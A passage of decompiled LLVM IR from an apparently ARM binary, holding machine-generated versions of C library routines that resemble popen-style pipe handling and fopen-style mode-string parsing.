  uselistorder i32 %v0_d0b0, { 1, 0 }
  uselistorder label %dec_label_pc_d148, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @function_d150(i32 %arg1) local_unnamed_addr {
dec_label_pc_d150:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_d150 = load i32, i32* @r4, align 4
  %v2_d154 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %v2_d154, i32* @r0, align 4
  %v1_d170 = call i32 @function_10d54()
  %v1_d180 = call i32 @function_10d4c()
  %v2_d188 = load i32, i32* @global_var_188a0.301, align 4
  store i32 %v2_d188, i32* %r4.global-to-local, align 4
  %v2_d18c = icmp eq i32 %v2_d188, 0
  br i1 %v2_d18c, label %dec_label_pc_d1d4, label %dec_label_pc_d1c0.preheader

dec_label_pc_d1c0.preheader:                      ; preds = %dec_label_pc_d150
  %v1_d1c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d1c0

dec_label_pc_d198:                                ; preds = %dec_label_pc_d1b0
  %v0_d198 = call i32 @function_cec4()
  %v2_d1a0 = inttoptr i32 %v0_d198 to i32*
  store i32 22, i32* %v2_d1a0, align 4
  br label %dec_label_pc_d1d4

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d204
  %v3_d1a8 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_d230

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d1c0
  %v1_d1b4 = inttoptr i32 %v0_d1cc to i32*
  %v2_d1b4 = load i32, i32* %v1_d1b4, align 4
  store i32 %v2_d1b4, i32* %r4.global-to-local, align 4
  %v2_d1b8 = icmp eq i32 %v2_d1b4, 0
  br i1 %v2_d1b8, label %dec_label_pc_d198, label %dec_label_pc_d1c0

dec_label_pc_d1c0:                                ; preds = %dec_label_pc_d1c0.preheader, %dec_label_pc_d1b0
  %v1_d1d0 = phi i32 [ ptrtoint (i32* @global_var_188a0.301 to i32), %dec_label_pc_d1c0.preheader ], [ %v0_d1cc, %dec_label_pc_d1b0 ]
  %v0_d1cc = phi i32 [ %v2_d188, %dec_label_pc_d1c0.preheader ], [ %v2_d1b4, %dec_label_pc_d1b0 ]
  %v1_d1c0 = add i32 %v0_d1cc, 4
  %v2_d1c0 = inttoptr i32 %v1_d1c0 to i32*
  %v3_d1c0 = load i32, i32* %v2_d1c0, align 4
  %v9_d1c4 = icmp eq i32 %v3_d1c0, %v1_d1c4.pre
  br i1 %v9_d1c4, label %dec_label_pc_d1cc, label %dec_label_pc_d1b0

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d1c0
  %v1_d1cc = inttoptr i32 %v0_d1cc to i32*
  %v2_d1cc = load i32, i32* %v1_d1cc, align 4
  %v2_d1d0 = inttoptr i32 %v1_d1d0 to i32*
  store i32 %v2_d1cc, i32* %v2_d1d0, align 4
  br label %dec_label_pc_d1d4

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d150, %dec_label_pc_d198, %dec_label_pc_d1cc
  store i32 %v2_d154, i32* @r0, align 4
  store i32 53736, i32* @lr, align 4
  %v1_d1e4 = call i32 @function_10d54()
  %v0_d1e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1e8 = icmp eq i32 %v0_d1e8, 0
  br i1 %v2_d1e8, label %dec_label_pc_d230, label %dec_label_pc_d1f0

dec_label_pc_d1f0:                                ; preds = %dec_label_pc_d1d4
  store i32 %v0_d1e8, i32* @r0, align 4
  %v1_d1f4 = add i32 %v0_d1e8, 8
  %v2_d1f4 = inttoptr i32 %v1_d1f4 to i32*
  %v3_d1f4 = load i32, i32* %v2_d1f4, align 4
  store i32 %v3_d1f4, i32* @r4, align 4
  %v0_d1f8 = call i32 @function_fdcc()
  %v0_d1fc = load i32, i32* @r5, align 4
  %v1_d200 = inttoptr i32 %v0_d1fc to i8*
  %v2_d200 = call i32 @function_ced0(i8* %v1_d200)
  %v2_d204 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_d204

dec_label_pc_d204:                                ; preds = %dec_label_pc_d21c, %dec_label_pc_d1f0
  store i32 %v2_d204, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* @r0, align 4
  %v3_d210 = call i32 @function_ce5c(i32 %v0_d20c, i32 %v2_d204, i32 0)
  %v1_d214 = icmp slt i32 %v3_d210, 0
  br i1 %v1_d214, label %dec_label_pc_d21c, label %dec_label_pc_d1a8

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d204
  %v0_d21c = call i32 @function_cec4()
  %v1_d220 = inttoptr i32 %v0_d21c to i32*
  %v2_d220 = load i32, i32* %v1_d220, align 4
  %v7_d224 = icmp eq i32 %v2_d220, 4
  br i1 %v7_d224, label %dec_label_pc_d204, label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d21c, %dec_label_pc_d1d4, %dec_label_pc_d1a8
  %storemerge = phi i32 [ %v3_d1a8, %dec_label_pc_d1a8 ], [ -1, %dec_label_pc_d1d4 ], [ -1, %dec_label_pc_d21c ]
  store i32 %v3_d150, i32* %r4.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_d1e8, { 1, 0, 2 }
  uselistorder i32 %v0_d1cc, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_d1d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d1c0, { 1, 0 }
}

define i32 @function_d250(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_d250:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d250 = load i32, i32* @r4, align 4
  store i32 %v3_d250, i32* %stack_var_-20, align 4
  %v16_d250 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d254 = load i8, i8* %arg2, align 1
  %v4_d254 = zext i8 %v3_d254 to i32
  store i32 %v4_d254, i32* %r3.global-to-local, align 4
  %v7_d25c = icmp eq i8 %v3_d254, 119
  store i32 %tmp, i32* @r4, align 4
  %v0_d264 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_d25c, label %dec_label_pc_d294, label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d250
  %v7_d26c = icmp eq i8 %v3_d254, 114
  br i1 %v7_d26c, label %bb, label %dec_label_pc_d27c

bb:                                               ; preds = %dec_label_pc_d26c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d29c

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d26c
  %v0_d27c = call i32 @function_cec4()
  store i32 %v0_d27c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_d28c = inttoptr i32 %v0_d27c to i32*
  store i32 22, i32* %v2_d28c, align 4
  br label %dec_label_pc_d468

dec_label_pc_d294:                                ; preds = %dec_label_pc_d250
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d29c

dec_label_pc_d29c:                                ; preds = %bb, %dec_label_pc_d294
  %v0_d368 = phi i32 [ 0, %dec_label_pc_d294 ], [ 1, %bb ]
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_d2a0 = call i32 @function_fc78(i32 12)
  store i32 %v1_d2a0, i32* %r0.global-to-local, align 4
  %v2_d2a4 = icmp eq i32 %v1_d2a0, 0
  br i1 %v2_d2a4, label %dec_label_pc_d468, label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d29c
  %v2_d2b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d2b4, i32* %r0.global-to-local, align 4
  %v1_d2b8 = call i32 @function_11410(i32 %v2_d2b4)
  store i32 %v1_d2b8, i32* %r0.global-to-local, align 4
  %v2_d2bc = icmp eq i32 %v1_d2b8, 0
  br i1 %v2_d2bc, label %dec_label_pc_d2c4, label %dec_label_pc_d458

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2b4
  store i32 %v16_d250, i32* %r0.global-to-local, align 4
  %v1_d2cc = xor i32 %v0_d368, 1
  store i32 -8, i32* @r2, align 4
  %tmp23 = sub nsw i32 0, %v1_d2cc
  %v4_d2d4 = and i32 %tmp23, 4
  %v5_d2d4 = add i32 %v4_d2d4, %v16_d250
  store i32 %v5_d2d4, i32* %r3.global-to-local, align 4
  %v2_d2d8 = add i32 %v5_d2d4, -8
  %v3_d2d8 = inttoptr i32 %v2_d2d8 to i32*
  %v4_d2d8 = load i32, i32* %v3_d2d8, align 4
  %tmp24 = sub nsw i32 0, %v0_d368
  %v4_d2e0 = and i32 %tmp24, 4
  %v5_d2e0 = add i32 %v4_d2e0, %v16_d250
  store i32 %v5_d2e0, i32* %r3.global-to-local, align 4
  %v2_d2e4 = add i32 %v5_d2e0, -8
  %v3_d2e4 = inttoptr i32 %v2_d2e4 to i32*
  %v4_d2e4 = load i32, i32* %v3_d2e4, align 4
  store i32 %v4_d2e4, i32* %r3.global-to-local, align 4
  %v0_d2e8 = load i32, i32* @r4, align 4
  store i32 %v4_d2d8, i32* %r0.global-to-local, align 4
  %v7_d2f4 = call i32 @function_1164c(i32 %v4_d2d8, i32 %v0_d2e8, i32 -8, i32 %v4_d2e4, i32 %v4_d2d8, i32 %v4_d2e4)
  store i32 %v7_d2f4, i32* %r0.global-to-local, align 4
  %v2_d2f8 = icmp eq i32 %v7_d2f4, 0
  br i1 %v2_d2f8, label %dec_label_pc_d304, label %dec_label_pc_d318

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2c4
  store i32 %v4_d2d8, i32* %r0.global-to-local, align 4
  %v1_d308 = call i32 @function_cbe4(i32 %v4_d2d8)
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v1_d310 = call i32 @function_cbe4(i32 %v4_d2e4)
  store i32 %v1_d310, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d458

dec_label_pc_d318:                                ; preds = %dec_label_pc_d2c4
  store i32 ptrtoint (i32* @global_var_18888.296 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_18888.296 to i32), i32* %r2.global-to-local, align 4
  %v2_d324 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d324, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_d330 = call i32 @function_10d54()
  %v0_d334 = load i32, i32* @r4, align 4
  store i32 %v0_d334, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_d340 = call i32 @function_10d4c()
  store i32 %v1_d340, i32* %r0.global-to-local, align 4
  %v1_d344 = call i32 @function_11120(i32 %v1_d340)
  store i32 %v1_d344, i32* %r0.global-to-local, align 4
  store i32 %v1_d344, i32* @r5, align 4
  %v2_d348 = icmp eq i32 %v1_d344, 0
  br i1 %v2_d348, label %dec_label_pc_d350, label %dec_label_pc_d3c0

dec_label_pc_d350:                                ; preds = %dec_label_pc_d318
  store i32 %v4_d2d8, i32* %r0.global-to-local, align 4
  %v1_d354 = call i32 @function_cbe4(i32 %v4_d2d8)
  store i32 %v1_d354, i32* %r0.global-to-local, align 4
  store i32 %v0_d368, i32* %r2.global-to-local, align 4
  %v9_d360 = icmp eq i32 %v4_d2e4, %v0_d368
  br i1 %v9_d360, label %dec_label_pc_d37c, label %dec_label_pc_d368

dec_label_pc_d368:                                ; preds = %dec_label_pc_d350
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v2_d370 = call i32 @function_11270(i32 %v4_d2e4, i32 %v0_d368)
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v1_d378 = call i32 @function_cbe4(i32 %v4_d2e4)
  store i32 %v1_d378, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d350, %dec_label_pc_d368
  store i32 ptrtoint (i32* @global_var_188a0.301 to i32), i32* %r3.global-to-local, align 4
  %storemerge3 = load i32, i32* @global_var_188a0.301, align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_d3985 = icmp eq i32 %storemerge3, 0
  br i1 %v2_d3985, label %dec_label_pc_d3a0, label %dec_label_pc_d388

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d388
  %v0_d388 = phi i32 [ %storemerge, %dec_label_pc_d388 ], [ %storemerge3, %dec_label_pc_d37c ]
  %v1_d388 = add i32 %v0_d388, 4
  %v2_d388 = inttoptr i32 %v1_d388 to i32*
  %v3_d388 = load i32, i32* %v2_d388, align 4
  store i32 %v3_d388, i32* %r3.global-to-local, align 4
  %v1_d38c = add i32 %v3_d388, 4
  %v2_d38c = inttoptr i32 %v1_d38c to i32*
  %v3_d38c = load i32, i32* %v2_d38c, align 4
  store i32 %v3_d38c, i32* %r0.global-to-local, align 4
  %v1_d390 = call i32 @function_cbe4(i32 %v3_d38c)
  store i32 %v1_d390, i32* %r0.global-to-local, align 4
  %v0_d394 = load i32, i32* @r4, align 4
  %v1_d394 = inttoptr i32 %v0_d394 to i32*
  %storemerge = load i32, i32* %v1_d394, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_d398 = icmp eq i32 %storemerge, 0
  br i1 %v2_d398, label %dec_label_pc_d3a0, label %dec_label_pc_d388

dec_label_pc_d3a0:                                ; preds = %dec_label_pc_d388, %dec_label_pc_d37c
  store i32 %v0_d264, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16224.309 to i32), i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16230.313 to i32), i32* %r2.global-to-local, align 4
  %v8_d3b4 = call i32 @function_10aa8(i32 ptrtoint ([8 x i8]* @global_var_16224.309 to i32), i32 ptrtoint ([3 x i8]* @global_var_1622c.311 to i32), i32 ptrtoint ([3 x i8]* @global_var_16230.313 to i32), i32 %v0_d264, i32 0)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_d3bc = call i32 @function_11248(i32 127)
  unreachable

dec_label_pc_d3c0:                                ; preds = %dec_label_pc_d318
  store i32 %v2_d324, i32* @r6, align 4
  store i32 %v2_d324, i32* @r0, align 4
  store i32 68948, i32* @r7, align 4
  %v1_d3d4 = call i32 @function_10d54()
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v1_d3dc = call i32 @function_cbe4(i32 %v4_d2e4)
  store i32 %v1_d3dc, i32* %r0.global-to-local, align 4
  %v0_d3e0 = load i32, i32* @r5, align 4
  %tmp26 = icmp slt i32 %v0_d3e0, 1
  br i1 %tmp26, label %dec_label_pc_d450, label %dec_label_pc_d3e8

dec_label_pc_d3e8:                                ; preds = %dec_label_pc_d3c0
  store i32 %v1_d2a0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18888.296 to i32), i32* %r4.global-to-local, align 4
  %v2_d3f4 = add i32 %v1_d2a0, 4
  %v3_d3f4 = inttoptr i32 %v2_d3f4 to i32*
  store i32 %v7_d2f4, i32* %v3_d3f4, align 4
  %v0_d3f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d3f8, i32* %r2.global-to-local, align 4
  %v0_d3fc = load i32, i32* @r5, align 4
  %v1_d3fc = load i32, i32* %r3.global-to-local, align 4
  %v2_d3fc = add i32 %v1_d3fc, 8
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 %v0_d3fc, i32* %v3_d3fc, align 4
  store i32 %v2_d324, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_d410 = call i32 @function_10d54()
  %v0_d414 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d414, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_d420 = call i32 @function_10d4c()
  store i32 ptrtoint (i32* @global_var_188a0.301 to i32), i32* %r2.global-to-local, align 4
  %v2_d42c = load i32, i32* @global_var_188a0.301, align 4
  %v2_d430 = inttoptr i32 %v1_d2a0 to i32*
  store i32 %v2_d42c, i32* %v2_d430, align 4
  store i32 %v1_d2a0, i32* %r3.global-to-local, align 4
  store i32 %v2_d324, i32* @r0, align 4
  %v1_d440 = load i32, i32* %r2.global-to-local, align 4
  %v2_d440 = inttoptr i32 %v1_d440 to i32*
  store i32 %v1_d2a0, i32* %v2_d440, align 4
  %v1_d448 = call i32 @function_10d54()
  store i32 %v1_d448, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d468

dec_label_pc_d450:                                ; preds = %dec_label_pc_d3c0
  store i32 %v7_d2f4, i32* %r0.global-to-local, align 4
  %v1_d454 = inttoptr i32 %v7_d2f4 to i8*
  %v2_d454 = call i32 @function_ced0(i8* %v1_d454)
  store i32 %v2_d454, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d458

dec_label_pc_d458:                                ; preds = %dec_label_pc_d2b4, %dec_label_pc_d304, %dec_label_pc_d450
  store i32 %v1_d2a0, i32* @r0, align 4
  %v0_d45c = call i32 @function_fdcc()
  store i32 %v0_d45c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d29c, %dec_label_pc_d3e8, %dec_label_pc_d27c, %dec_label_pc_d458
  %stack_var_-64.1 = phi i32 [ 0, %dec_label_pc_d29c ], [ 0, %dec_label_pc_d458 ], [ %v7_d2f4, %dec_label_pc_d3e8 ], [ 0, %dec_label_pc_d27c ]
  store i32 %stack_var_-64.1, i32* %r0.global-to-local, align 4
  %v2_d470 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d470, i32* %r4.global-to-local, align 4
  ret i32 %stack_var_-64.1

; uselistorder directives
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v7_d2f4, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v4_d2e4, { 1, 0, 3, 2, 7, 6, 8, 5, 4, 10, 9, 11 }
  uselistorder i32 %v4_d2d8, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 %v1_d2a0, { 5, 1, 0, 2, 4, 3, 6, 7 }
  uselistorder i32 %v0_d368, { 1, 4, 3, 0, 2 }
  uselistorder i32 %v0_d264, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 8, 6, 0, 7, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 32, 1, 19, 21, 20, 22, 31, 23, 24, 30, 25, 27, 26, 29, 28, 2, 3 }
  uselistorder i32* @global_var_188a0.301, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_188a0.301 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_18888.296 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_d468, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d458, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d388, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d29c, { 1, 0 }
}

define i32 @function_d498(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d498:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d498 = load i32, i32* @r4, align 4
  store i32 %v3_d498, i32* %stack_var_-24, align 4
  %v6_d498 = load i32, i32* @r5, align 4
  %v9_d498 = load i32, i32* @r6, align 4
  %v15_d498 = load i32, i32* @r8, align 4
  %v3_d49c = load i8, i8* %arg2, align 1
  %v7_d4a0 = icmp eq i8 %v3_d49c, 114
  store i1 %v7_d4a0, i1* %cpsr_z.global-to-local, align 1
  %v2_d4a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r5, align 4
  br i1 %v7_d4a0, label %dec_label_pc_d4fc, label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d498
  %v7_d4b8 = icmp eq i8 %v3_d49c, 119
  store i1 %v7_d4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4b8, label %bb, label %dec_label_pc_d4c4

bb:                                               ; preds = %dec_label_pc_d4b8
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_d500

dec_label_pc_d4c4:                                ; preds = %dec_label_pc_d4b8
  %v7_d4c4 = icmp eq i8 %v3_d49c, 97
  store i1 %v7_d4c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4c4, label %bb31, label %dec_label_pc_d4d0

bb31:                                             ; preds = %dec_label_pc_d4c4
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_d500

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d4c4, %dec_label_pc_d588, %dec_label_pc_d55c
  %v0_d4d0 = call i32 @function_cec4()
  store i32 %v0_d4d0, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_d4d8 = load i32, i32* @r8, align 4
  %v2_d4d8 = icmp eq i32 %v0_d4d8, 0
  store i1 %v2_d4d8, i1* %cpsr_z.global-to-local, align 1
  %v2_d4dc = inttoptr i32 %v0_d4d0 to i32*
  store i32 22, i32* %v2_d4dc, align 4
  br i1 %v2_d4d8, label %dec_label_pc_d750, label %dec_label_pc_d4e4

dec_label_pc_d4e4:                                ; preds = %dec_label_pc_d5ac._crit_edge, %dec_label_pc_d4d0
  %v0_d4e4 = load i32, i32* @r8, align 4
  %v1_d4e4 = add i32 %v0_d4e4, 1
  %v2_d4e4 = inttoptr i32 %v1_d4e4 to i8*
  %v3_d4e4 = load i8, i8* %v2_d4e4, align 1
  %v4_d4e4 = zext i8 %v3_d4e4 to i32
  store i32 %v4_d4e4, i32* %r3.global-to-local, align 4
  %v1_d4e8 = and i32 %v4_d4e4, 32
  %v2_d4e8 = icmp eq i32 %v1_d4e8, 0
  store i1 %v2_d4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d4e8, label %dec_label_pc_d750, label %dec_label_pc_d4f0

dec_label_pc_d4f0:                                ; preds = %dec_label_pc_d4e4
  store i32 %v0_d4e4, i32* @r0, align 4
  %v0_d4f4 = call i32 @function_fdcc()
  store i32 %v0_d4f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d750

dec_label_pc_d4fc:                                ; preds = %dec_label_pc_d498
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d500

dec_label_pc_d500:                                ; preds = %bb, %bb31, %dec_label_pc_d4fc
  %v1_d518 = phi i32 [ 577, %bb ], [ 1089, %bb31 ], [ 1, %dec_label_pc_d4fc ]
  %v2_d500 = add i32 %tmp, 1
  %v3_d500 = inttoptr i32 %v2_d500 to i8*
  %v4_d500 = load i8, i8* %v3_d500, align 1
  %v7_d504 = icmp eq i8 %v4_d500, 98
  store i1 %v7_d504, i1* %cpsr_z.global-to-local, align 1
  %v2_d500.tmp = select i1 %v7_d504, i32 %v2_d500, i32 %tmp
  store i32 %v2_d500.tmp, i32* %r3.global-to-local, align 4
  %v1_d510 = add i32 %v2_d500.tmp, 1
  %v2_d510 = inttoptr i32 %v1_d510 to i8*
  %v3_d510 = load i8, i8* %v2_d510, align 1
  %v4_d510 = zext i8 %v3_d510 to i32
  store i32 %v4_d510, i32* %r3.global-to-local, align 4
  %v7_d514 = icmp eq i8 %v3_d510, 43
  store i1 %v7_d514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d514, label %bb34, label %.thread4

bb34:                                             ; preds = %dec_label_pc_d500
  store i32 %v1_d518, i32* %r3.global-to-local, align 4
  %v2_d51c = add nuw nsw i32 %v1_d518, 1
  store i32 %v2_d51c, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_d500, %bb34
  %v2_d520 = icmp eq i32 %arg3, 0
  store i1 %v2_d520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d520, label %dec_label_pc_d528, label %dec_label_pc_d554

dec_label_pc_d528:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_d52c = call i32 @function_fc78(i32 80)
  store i32 %v1_d52c, i32* %r0.global-to-local, align 4
  store i32 %v1_d52c, i32* @r8, align 4
  %v3_d530 = icmp eq i32 %v1_d52c, 0
  store i1 %v3_d530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d530, label %dec_label_pc_d754, label %dec_label_pc_d538

dec_label_pc_d538:                                ; preds = %dec_label_pc_d528
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_d540 = add i32 %v1_d52c, 1
  %v4_d540 = inttoptr i32 %v3_d540 to i8*
  store i8 32, i8* %v4_d540, align 1
  %v0_d544 = load i32, i32* %r2.global-to-local, align 4
  %v1_d544 = load i32, i32* @r8, align 4
  %v2_d544 = add i32 %v1_d544, 8
  %v3_d544 = inttoptr i32 %v2_d544 to i32*
  store i32 %v0_d544, i32* %v3_d544, align 4
  %v0_d548 = load i32, i32* %r2.global-to-local, align 4
  %v1_d548 = trunc i32 %v0_d548 to i8
  %v2_d548 = load i32, i32* @r8, align 4
  %v3_d548 = inttoptr i32 %v2_d548 to i8*
  store i8 %v1_d548, i8* %v3_d548, align 1
  %v0_d54c = load i32, i32* @r8, align 4
  %v1_d54c = add i32 %v0_d54c, 56
  store i32 %v1_d54c, i32* @r0, align 4
  %v0_d550 = call i32 @function_d800()
  store i32 %v0_d550, i32* %r0.global-to-local, align 4
  %v0_d554.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d554

dec_label_pc_d554:                                ; preds = %.thread4, %dec_label_pc_d538
  %v0_d5ac = phi i32 [ %arg4, %.thread4 ], [ %v0_d554.pre, %dec_label_pc_d538 ]
  %v1_d554 = icmp slt i32 %v0_d5ac, 0
  %v2_d554 = icmp eq i32 %v0_d5ac, 0
  store i1 %v2_d554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d554, label %dec_label_pc_d5ac, label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d554
  %v0_d560 = load i32, i32* @r4, align 4
  %v2_d560 = and i32 %v0_d560, 131075
  %v1_d564 = add nuw nsw i32 %v2_d560, 1
  store i32 %v1_d564, i32* %r2.global-to-local, align 4
  %v0_d568 = load i32, i32* @r6, align 4
  %v1_d568 = add i32 %v0_d568, 1
  %v2_d56c = and i32 %v1_d568, %v1_d564
  store i32 %v2_d56c, i32* %r3.global-to-local, align 4
  %v9_d570 = icmp eq i32 %v2_d56c, %v1_d564
  store i1 %v9_d570, i1* %cpsr_z.global-to-local, align 1
  %v1_d574 = load i32, i32* @r8, align 4
  %v2_d574 = add i32 %v1_d574, 4
  %v3_d574 = inttoptr i32 %v2_d574 to i32*
  store i32 %v0_d5ac, i32* %v3_d574, align 4
  br i1 %v9_d570, label %dec_label_pc_d57c, label %dec_label_pc_d4d0

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d55c
  %v0_d57c = load i32, i32* @r4, align 4
  %v1_d57c = load i32, i32* @r6, align 4
  %v2_d57c = sub i32 -1, %v1_d57c
  %v3_d57c = and i32 %v0_d57c, %v2_d57c
  store i32 %v3_d57c, i32* %r3.global-to-local, align 4
  %v1_d580 = and i32 %v3_d57c, 1024
  %v2_d580 = icmp eq i32 %v1_d580, 0
  store i1 %v2_d580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d580, label %dec_label_pc_d5a0, label %dec_label_pc_d588

dec_label_pc_d588:                                ; preds = %dec_label_pc_d57c
  %v0_d588 = load i32, i32* @r5, align 4
  store i32 %v0_d588, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_d594 = call i32 @function_11158(i32 %v0_d588, i32 4)
  store i32 %v2_d594, i32* %r0.global-to-local, align 4
  %v2_d598 = icmp eq i32 %v2_d594, 0
  store i1 %v2_d598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d598, label %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge, label %dec_label_pc_d4d0

dec_label_pc_d588.dec_label_pc_d5a0_crit_edge:    ; preds = %dec_label_pc_d588
  %v0_d5a0.pre = load i32, i32* @r6, align 4
  %v0_d5a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5a0

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge, %dec_label_pc_d57c
